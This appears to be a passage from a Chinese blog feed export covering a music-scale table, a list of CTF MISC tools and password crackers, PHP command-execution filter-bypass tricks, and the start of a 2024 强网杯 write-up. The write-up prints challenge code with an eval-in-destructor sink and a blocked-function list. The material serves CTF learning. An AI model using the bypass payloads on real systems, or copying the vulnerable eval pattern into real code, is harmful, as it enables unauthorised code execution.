自然大调音阶一览表</p><table><thead><tr><th>1&#x3D;C</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>A</th><th>B</th><th>C</th></tr></thead><tbody><tr><td>1&#x3D;♯C(第一个黑键)</td><td>♯C</td><td>♯D</td><td>♯E</td><td>♯F</td><td>♯G</td><td>♯A</td><td>♯B</td><td>♯C</td></tr><tr><td>1&#x3D;♭D(第一个黑键)</td><td>♭D</td><td>♭E</td><td>F</td><td>♭G</td><td>♭A</td><td>♭B</td><td>C</td><td>♭D</td></tr><tr><td>1&#x3D;D</td><td>D</td><td>E</td><td>♯F</td><td>G</td><td>A</td><td>B</td><td>♯C</td><td>D</td></tr><tr><td>1&#x3D;♭E(第二个黑键)</td><td>♭E</td><td>F</td><td>G</td><td>♭A</td><td>♭B</td><td>C</td><td>D</td><td>♭E</td></tr><tr><td>1&#x3D;E</td><td>E</td><td>♯F</td><td>♯G</td><td>A</td><td>B</td><td>♯C</td><td>♯D</td><td>E</td></tr><tr><td>1&#x3D;F</td><td>F</td><td>G</td><td>A</td><td>♭B</td><td>C</td><td>D</td><td>E</td><td>F</td></tr><tr><td>1&#x3D;♯F(第三个黑键)</td><td>♯F</td><td>♯G</td><td>♯A</td><td>B</td><td>♯C</td><td>♯D</td><td>♯E</td><td>♯F</td></tr><tr><td>1&#x3D;♭G(第三个黑键)</td><td>♭G</td><td>♭A</td><td>♭B</td><td>♭C</td><td>♭D</td><td>♭E</td><td>F</td><td>♭G</td></tr><tr><td>1&#x3D;G</td><td>G</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>♯F</td><td>G</td></tr><tr><td>1&#x3D;♭A(第四个黑键)</td><td>♭A</td><td>♭B</td><td>C</td><td>♭D</td><td>♭E</td><td>F</td><td>G</td><td>♭A</td></tr><tr><td>1&#x3D;A</td><td>A</td><td>B</td><td>♯C</td><td>D</td><td>E</td><td>♯F</td><td>♯G</td><td>A</td></tr><tr><td>1&#x3D;♭B(第五个黑键)</td><td>♭B</td><td>C</td><td>D</td><td>♭E</td><td>F</td><td>G</td><td>A</td><td>♭B</td></tr><tr><td>1&#x3D;B(第七个白键)</td><td>B</td><td>♯C</td><td>♯D</td><td>E</td><td>♯F</td><td>♯G</td><td>♯A</td><td>B</td></tr><tr><td>1&#x3D;♭C(第七个白键)</td><td>♭C</td><td>♭D</td><td>♭E</td><td>♭F</td><td>♭G</td><td>♭A</td><td>♭B</td><td>♭C</td></tr></tbody></table><p>自然大调的所有音阶如上表所示，一共有十五个大调，对应十二个音。其中第一个黑键上的“1&#x3D;♯C”与“1&#x3D;♭D”、第一个黑键上的“1&#x3D;♯F”与“1&#x3D;♭G”、第七个白键上的“1&#x3D;B”与“1&#x3D;♭C”是等音调，调式中的所有音完全相同，只是音名不同。<br>为了方便起见，大调中的音名最好不要含有重升重降符号，第二个黑键上的“1&#x3D;♯D”、第四个黑键上的“1&#x3D;♯G”、第五个黑键上的“1&#x3D;♯A”其大调内音名含有重升符号，不符合方便的原则，因此没有列在上表中。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF MISC常用工具集锦/使用方法简介</title>
    <link href="/2024/11/09/CTF-MISC%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E9%94%A6-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/"/>
    <url>/2024/11/09/CTF-MISC%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E9%94%A6-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-MISC常用工具集锦-使用方法简介"><a href="#CTF-MISC常用工具集锦-使用方法简介" class="headerlink" title="CTF MISC常用工具集锦&#x2F;使用方法简介"></a>CTF MISC常用工具集锦&#x2F;使用方法简介</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>MISC题型多变而且工具繁杂，因此自己花时间整理了一份工具列表，以便日后参考用</p><p><strong>流畅地阅读这篇博客，你可能需要：</strong></p><ul><li>Python2.7.18 + Python3.8 + 任何一个更高版本的Python，使用conda管理</li><li>Linux虚拟机，kali即可</li><li>流畅访问Google&#x2F;GitHub等站点的网络</li></ul><h2 id="通用工具"><a href="#通用工具" class="headerlink" title="通用工具"></a>通用工具</h2><h3 id="PuzzleSolver"><a href="#PuzzleSolver" class="headerlink" title="PuzzleSolver"></a>PuzzleSolver</h3><p>专为misc手打造的瑞士军刀(?)，整合了多种脚本（base，字频分析，png&#x2F;bmp自动修复文件头，图片盲水印等等）的带GUI的工具 仓库：<a href="https://github.com/Byxs20/PuzzleSolver">Github - PuzzleSolver</a></p><h3 id="随波逐流-CTF编码工具"><a href="#随波逐流-CTF编码工具" class="headerlink" title="[随波逐流]CTF编码工具"></a>[随波逐流]CTF编码工具</h3><p>集成了绝大部分编码的解码&#x2F;转换工具，有一键解码功能，简单题直接一把梭 <a href="http://www.1o1o.xyz/index.html">官网</a></p><h3 id="010-Editor"><a href="#010-Editor" class="headerlink" title="010 Editor"></a>010 Editor</h3><p>功能强大的十六进制编辑工具，有文件模板功能，便于修改各种缺失文件头文件尾。</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>一个分析文件并提取嵌入的文件和代码的工具，可以判断源文件中包含的隐藏文件种类 仓库：<a href="https://github.com/ReFirmLabs/binwalk">Github - binwalk</a> 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -e stego.zip        <span class="hljs-comment">#提取stego.zip</span><br></code></pre></td></tr></table></figure><h3 id="steghide-stegseek"><a href="#steghide-stegseek" class="headerlink" title="steghide&#x2F;stegseek"></a>steghide&#x2F;stegseek</h3><p>steghide隐写和配套解密工具，配合rockyou.txt食用更佳 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">stegseek [stegofile.jpg] [wordlist.txt]        <span class="hljs-comment">#用wordlist暴力破解stegofile</span><br>stegseek --seed [stegofile.jpg]        <span class="hljs-comment"># 分析此文件是否包含steghide内容，包含多少隐藏内容，是如何加密的</span><br></code></pre></td></tr></table></figure><h3 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h3><p>赛博厨子，ctf编码神器，方便易用，可以下载本地离线使用 链接：<a href="https://cyberchef.org/">官网</a></p><h3 id="Ciphey"><a href="#Ciphey" class="headerlink" title="Ciphey"></a>Ciphey</h3><p>一个功能强大的ai全自动解密工具，输入密文后自动返回解密文本并指出加密方式（虽然不能百分百解出，但有时候试试会有奇效） 仓库：<a href="https://github.com/Ciphey/Ciphey">Github - Ciphet</a> 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ciphey -t <span class="hljs-string">&quot;put_encrypted_message_here&quot;</span><br>ciphey -f encrypted_message.txt<br><span class="hljs-comment"># 加上-q 直接给出结果</span><br><span class="hljs-comment"># 加上-g 只输出答案</span><br></code></pre></td></tr></table></figure><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h3><p>常用于LSB隐写分析&#x2F;内容提取、GIF查看单帧</p><h3 id="SilentEye"><a href="#SilentEye" class="headerlink" title="SilentEye"></a>SilentEye</h3><p>分析bmp&#x2F;wav中的隐写</p><h3 id="OurSecret"><a href="#OurSecret" class="headerlink" title="OurSecret"></a>OurSecret</h3><p>带密码的jpg隐写工具</p><h3 id="Acropalypse-Multi-Tool"><a href="#Acropalypse-Multi-Tool" class="headerlink" title="Acropalypse-Multi-Tool"></a>Acropalypse-Multi-Tool</h3><p>一个基于CVE-2023-28303和CVE-2023-21036漏洞的工具，可用于恢复截图被裁剪掉的部分数据 仓库：<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">Github - Acropalypse Multi Tool</a></p><h3 id="QR-Research"><a href="#QR-Research" class="headerlink" title="QR Research"></a>QR Research</h3><p>二维码识别&#x2F;补全软件，支持各种纠错等级和二维码种类</p><h3 id="QrScan"><a href="#QrScan" class="headerlink" title="QrScan"></a>QrScan</h3><p>另一个二维码识别软件，特点是能批量识别并输出到csv文件中 仓库：<a href="https://github.com/zfb132/QrScan">Github - QrScan</a></p><h3 id="ImageMagick-gaps"><a href="#ImageMagick-gaps" class="headerlink" title="ImageMagick&#x2F;gaps"></a>ImageMagick&#x2F;gaps</h3><p>多功能图像处理工具，多用于拼图，先用ImageMagick把打乱的图像拼接，再使用gaps识别并自动整理 链接（ImageMagick）：<a href="https://github.com/ImageMagick/ImageMagick">Github - ImageMagick</a> &amp; <a href="https://imagemagick.org/">官网</a> 链接（gaps）：<a href="https://github.com/nemanja-m/gaps">Github - gaps</a> 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">magick.exe montage *.jpg  -tile 22x2  -geometry 64x256+0+0 abc.jpg<br><span class="hljs-comment"># 将目录里的jpg文件按顺序拼成x轴22块，y轴2块的图 ，每个图块的大小为64X512像素，输出文件为abc.jpg</span><br><br>gaps run --image=img.png --size=xxx --save<br><span class="hljs-comment"># size填拼图各块的长宽</span><br><span class="hljs-comment"># 额外参数：</span><br>–generations <span class="hljs-comment"># 遗传算法迭代次数，效果不好时适当改变</span><br>–population <span class="hljs-comment"># 个体数量</span><br></code></pre></td></tr></table></figure><h2 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写"></a>文件隐写</h2><h3 id="wbs4-3open"><a href="#wbs4-3open" class="headerlink" title="wbs4.3open"></a>wbs4.3open</h3><p>带密码的pdf隐写工具</p><h3 id="AOPR-Forensic-Edition"><a href="#AOPR-Forensic-Edition" class="headerlink" title="AOPR Forensic Edition"></a>AOPR Forensic Edition</h3><p>文档密码破解工具，支持暴力、字典、掩码等，可利用VBA后门 一个可用的学习版链接：<a href="https://bbs.pcbeta.com/viewthread-1964941-1-1.html">pcbeta</a></p><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p>开源的音频编辑软件，可以可视化查看频谱、音轨，便于找出音频中的分析点</p><h3 id="DeepSound-2-0"><a href="#DeepSound-2-0" class="headerlink" title="DeepSound 2.0"></a>DeepSound 2.0</h3><p>带密码的wav隐写分析工具</p><h3 id="RX-SSTV"><a href="#RX-SSTV" class="headerlink" title="RX-SSTV"></a>RX-SSTV</h3><p>一个sstv识别工具，可将声音信息转为图像</p><h3 id="QSSTV"><a href="#QSSTV" class="headerlink" title="QSSTV"></a>QSSTV</h3><p>linux上的sstv接收软件，特点是可以直接读取wav音频文件里的信息，免去了外放的困扰 仓库：<a href="https://github.com/ON4QZ/QSSTV">Github - QSSTV</a></p><h3 id="mp3stego"><a href="#mp3stego" class="headerlink" title="mp3stego"></a>mp3stego</h3><p>正如其名，是一个命令行mp3隐写分析工具 链接：<a href="https://www.petitcolas.net/steganography/mp3stego/">mp3stego</a></p><h2 id="压缩包分析"><a href="#压缩包分析" class="headerlink" title="压缩包分析"></a>压缩包分析</h2><h3 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h3><p>zip伪加密修复 快速入门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ZipCenOp.jar r fake_encrypted.zip<br></code></pre></td></tr></table></figure><h3 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h3><p>暴力破解工具，支持掩码、字典、明文攻击等手段</p><h3 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h3><p>zip明文攻击工具，和ARCHPR相比支持更多的参数 条件：1.ZipCrypto加密方式 2.已知其中某个完整的明文文件&#x2F;已知明文的至少12个字节和偏移（其中又至少8字节要连续）</p><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><p>宇宙最强密码&#x2F;哈希破解工具，支持多种系统，cpu&#x2F;gpu&#x2F;apu计算，支持多种hash算法，可破解rar、office文档、pdf等文件。</p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h3><p>抓包流量分析软件 快速入门：</p><h4 id="mac地址-ip-端口过滤"><a href="#mac地址-ip-端口过滤" class="headerlink" title="mac地址&#x2F;ip&#x2F;端口过滤"></a>mac地址&#x2F;ip&#x2F;端口过滤</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eth.addr==<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>   //筛选<span class="hljs-title class_">MAC</span>地址是<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>的数据包，包括源或者目的<span class="hljs-title class_">MAC</span>地址<br>eth.src==<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>    //源<span class="hljs-title class_">MAC</span>地址是<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span><br>eth.dst==<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span>    //目的<span class="hljs-title class_">MAC</span>地址是<span class="hljs-number">20</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:f3</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:cc</span><br><br>ip.addr==<span class="hljs-number">192.168</span>.<span class="hljs-number">1.122</span>        //筛选出<span class="hljs-title class_">IP</span>地址是<span class="hljs-number">192.168</span>.<span class="hljs-number">1.122</span>的数据包，包括源<span class="hljs-title class_">IP</span>地址或者目的<span class="hljs-title class_">IP</span>地址<br>ip.src== 和ip.dst==同上<br><br>tcp.port==<span class="hljs-number">80</span>         //根据<span class="hljs-title class_">TCP</span>端口筛选数据包，包括源端口或者目的端口<br>tcp.dstport==<span class="hljs-number">80</span>        //根据目的<span class="hljs-title class_">TCP</span>端口筛选<br>tcp.srcport==<span class="hljs-number">80</span>        //根据源<span class="hljs-title class_">TCP</span>端口筛选<br>udp.port==<span class="hljs-number">4010</span>       //根据<span class="hljs-title class_">UDP</span>端口筛选数据包，包括源端口或者目的端口<br>udp.srcport==<span class="hljs-number">4010</span>      //根据源<span class="hljs-title class_">UDP</span>端口筛选<br>udp.dstport==<span class="hljs-number">4010</span>      //根据目的<span class="hljs-title class_">UDP</span>端口筛选<br></code></pre></td></tr></table></figure><h4 id="协议筛选"><a href="#协议筛选" class="headerlink" title="协议筛选"></a>协议筛选</h4><p>常见协议：udp，tcp，arp，icmp，smtp，pop，dns，ip，ssl，http，ftp，ssh</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http <span class="hljs-comment">//过滤http流量</span><br>http<span class="hljs-selector-class">.request</span>.method==GET/POST<br>http<span class="hljs-selector-class">.response</span><br>http<span class="hljs-selector-class">.response</span><span class="hljs-selector-class">.code</span> &gt;=<span class="hljs-number">400</span>（包含错误码）<br>http<span class="hljs-selector-class">.response</span><span class="hljs-selector-class">.phrase</span> == “OK”（过滤响应中的phrase）<br>http contains <span class="hljs-string">&quot;snapshot&quot;</span> <span class="hljs-comment">//过滤http头中含有指定字符</span><br>http<span class="hljs-selector-class">.server</span> contains “snapshot” <span class="hljs-comment">//过滤http头中server字段含有指定字符</span><br>http<span class="hljs-selector-class">.content_type</span> == “text/html” <span class="hljs-comment">//过滤content_type是text/html的http响应、post包</span><br>http<span class="hljs-selector-class">.content_encoding</span> == “gzip” <span class="hljs-comment">//过滤content_encoding是gzip的http包</span><br>http<span class="hljs-selector-class">.transfer_encoding</span> == “chunked” <span class="hljs-comment">//根据transfer_encoding过滤</span><br>http<span class="hljs-selector-class">.content_length</span> == <span class="hljs-number">279</span><br>http<span class="hljs-selector-class">.content_length_header</span> == “<span class="hljs-number">279</span>” <span class="hljs-comment">//根据content_length的数值过滤</span><br>http<span class="hljs-selector-class">.server</span> <span class="hljs-comment">//过滤所有含有http头中含有server字段的数据包</span><br></code></pre></td></tr></table></figure><p>也可参考：<a href="https://zhuanlan.zhihu.com/p/631821119">知乎 - Wireshark教程</a></p><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC^2"></a>MISC^2</h2><h3 id="ntfsstreamseditor"><a href="#ntfsstreamseditor" class="headerlink" title="ntfsstreamseditor"></a>ntfsstreamseditor</h3><p>NTFS数据流隐写</p><h3 id="veracrypt"><a href="#veracrypt" class="headerlink" title="veracrypt"></a>veracrypt</h3><p>磁盘加密软件，可建立虚拟磁盘并利用密码或者密钥文件进行加密，支持各种加密算法</p><h3 id="Cheat-Engine"><a href="#Cheat-Engine" class="headerlink" title="Cheat Engine"></a>Cheat Engine</h3><p>功能如其名，做一些游戏题的时候可以用这个走走捷径。 <em>不要和带反作弊的游戏一起开</em></p><h3 id="bruteHASH"><a href="#bruteHASH" class="headerlink" title="bruteHASH"></a>bruteHASH</h3><p>穷举指定格式的数据的HASH值，格式可以为：</p><ul><li>指定明文格式</li><li>不限定明文格式随机字符穷举</li><li>自定义穷举字符集</li><li>CTF 常见 HASH(MD4&#x2F;MD5&#x2F;SHA1)</li><li>设置 HASH 开头、结尾或包含字符串</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>杂项</tag>
      
      <tag>工具收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>REC绕过技巧收集</title>
    <link href="/2024/11/05/REC%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E6%94%B6%E9%9B%86/"/>
    <url>/2024/11/05/REC%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><blockquote><p>字符串拼接绕过 (“syste”.”m”)(“ls”);</p><p>双写绕过    syssystemtem(“ls”);</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>rce绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024强网杯复现wp</title>
    <link href="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/"/>
    <url>/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h2><p>打开只有登录框，扫描目录发现源码<a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;user.php&#x27;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br><br><span class="hljs-variable">$sessionManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionManager</span>();<br><span class="hljs-variable">$SessionRandom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionRandom</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session_key&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session_key&#x27;</span>] =<span class="hljs-variable">$SessionRandom</span> -&gt; <span class="hljs-title function_ invoke__">generateRandomString</span>();<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$password</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$sessionManager</span>-&gt;<span class="hljs-title function_ invoke__">filterSensitiveFunctions</span>();<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: dashboard.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;login.php&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notouchitsclass</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$data</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;data);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SessionRandom</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>);<br><br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;<br>    <span class="hljs-variable">$charactersLength</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>);<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$charactersLength</span> - <span class="hljs-number">1</span>)];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SessionManager</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sessionPath</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sessionId</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sensitiveFunctions</span> = [<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>];<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">session_status</span>() == PHP_SESSION_NONE) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Session has not been started. Please start a session before using this class.&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;sessionPath = <span class="hljs-title function_ invoke__">session_save_path</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;sessionId = <span class="hljs-title function_ invoke__">session_id</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSessionFilePath</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;sessionPath . <span class="hljs-string">&quot;/sess_&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;sessionId;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span 